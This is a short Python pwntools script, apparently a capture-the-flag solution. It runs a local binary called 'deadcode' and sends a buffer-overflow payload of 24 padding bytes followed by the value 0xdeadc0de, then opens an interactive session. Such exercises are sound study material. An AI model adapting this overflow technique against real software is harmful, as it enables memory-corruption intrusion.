from pwn import *

r = process("./deadcode")

payload = "A"*24 + p64(0xdeadc0de)

r.sendline(payload)
r.interactive()